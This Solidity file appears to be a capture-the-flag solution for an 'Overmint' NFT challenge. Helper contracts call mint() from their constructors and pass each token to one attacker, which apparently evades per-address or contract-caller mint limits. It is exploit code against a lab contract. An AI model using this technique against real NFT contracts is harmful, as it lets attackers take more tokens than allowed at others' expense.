// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attack is IERC721Receiver{

     // msg.sender (caller) of this contract will be the Main contract
 
     constructor(Overmint overmint, address attacker, uint256 i){
         overmint.mint();
         overmint.safeTransferFrom(address(this),attacker,i); 
     }
 
     function onERC721Received(
         address /*operator*/,
         address /*from*/,
         uint256 /*tokenId*/,
         bytes calldata /* data*/
     ) external pure returns (bytes4){
       return IERC721Receiver.onERC721Received.selector;
     }
 }
 
contract Main{
     
     Overmint public overmint;
 
     constructor(){
        overmint = new Overmint();
        
        for (uint256 i=1; i<=5; i++){
         new Attack(overmint, msg.sender,i);
         }
     }
 
     function success() external view returns(uint256 minted_NFTs, uint256 attackers_NFT){
         return (overmint.totalSupply(), overmint.balanceOf(msg.sender));
     }
 }
 